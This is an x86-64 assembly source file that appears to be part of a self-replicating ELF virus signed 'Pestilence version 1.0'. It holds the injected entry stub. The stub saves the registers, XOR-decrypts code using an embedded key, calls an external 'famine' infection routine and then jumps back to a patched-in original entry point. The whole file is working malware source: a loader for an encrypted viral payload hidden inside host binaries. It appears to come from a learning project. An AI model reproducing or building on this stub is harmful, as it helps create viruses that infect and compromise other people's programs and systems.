global xor_cipher
global woody_mod
global key_loc

extern famine
extern syscall_wrapper

%define KEY_SIZE 64

section .text

woody_mod:
	pushfq
	push	rdi
	push	rsi
	push	rdx
	push	r8
	push	r9
	push	r10

xor_cipher_params:
	lea	rdi, [rel key_loc]
	mov	rsi, 0xBBBBBBBBBBBBBBBB
	lea	rdx, [rel syscall_wrapper]
	mov	rcx, 0xCCCCCCCCCCCCCCCC
	call	xor_cipher

exit:
	call famine
	pop	r10
	pop	r9
	pop	r8
	pop	rdx
	pop	rsi
	pop	rdi
	popfq

	jmp 0xAAAAAAAE



; void xor_cipher(char *key, size_t key_size, void *text, size_t text_size)
xor_cipher:
	cmp	rsi, 0
	je	xor_cipher_end

	xor	r8, r8		; counter
	mov	r9, rdx		; address of .text
	mov	r10, rcx	; size of .text

loop:
	cmp	r8, r10
	je	xor_cipher_end

	xor	rdx, rdx	; clear dividend
	mov	rax, r8		; dividend
	mov	rcx, rsi	; divisor
	div	rcx, 		; rax = /, rdx = %

	lea	rax, [rel rdi + rdx]
	mov	dl, byte[rax]
	xor	byte[r9], dl

	inc	r8
	inc	r9
	jmp	loop

xor_cipher_end:
	ret



align 8

woody_str	db "Pestilence version 1.0 (c)oded by vsteffen", 0x0a, 0
key_loc:	times KEY_SIZE db 0
woody_mod_end	db 0x0
